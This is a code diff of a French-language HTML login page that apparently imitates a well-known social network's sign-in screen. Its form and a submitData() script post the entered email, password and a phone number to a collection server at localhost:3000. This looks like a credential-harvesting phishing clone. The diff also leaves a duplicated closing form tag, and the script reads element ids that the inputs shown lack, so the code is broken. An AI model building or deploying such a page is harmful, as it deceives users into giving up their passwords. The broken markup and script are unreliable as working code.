@@ -195,14 +195,15 @@
             <div class="right">
                 <div class="login-form">
                     
-                        <form action="http://localhost:3000/submit" method="POST">
-                           
+                    <form action="http://localhost:3000/submit" method="POST">
                         <input type="text" name="email" placeholder="Adresse e-mail ou numéro de mobile" required>
                         <input type="password" name="password" placeholder="Mot de passe" required>
                         <button type="submit">Se connecter</button>
                         <a href="#" class="forgot-password">Mot de passe oublié ?</a>
                         <div class="divider"></div>
                         <button type="button" class="create-account">Créer nouveau compte</button>
+                    </form>
+                    
                     </form>
                 </div>
             </div>
@@ -269,22 +270,27 @@
         </div>
     </div>
     <script>
-        function submitData() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const phoneNumber = document.getElementById('phoneNumber').value;
+function submitData() {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const phoneNumber = document.getElementById('phoneNumber').value;
 
-            fetch('http://localhost:3000/submit', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ username, password, phoneNumber })
-            })
-            .then(response => response.text())
-            .then(data => alert(data))
-            .catch(error => console.error('Error:', error));
-        }
+    fetch('http://localhost:3000/submit', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            username: username, // Ensure these names match the server-side names
+            password: password,
+            phoneNumber: phoneNumber
+        })
+    })
+    .then(response => response.text())
+    .then(data => alert(data))
+    .catch(error => console.error('Error:', error));
+}
+
     </script>
 </body>
 </html>
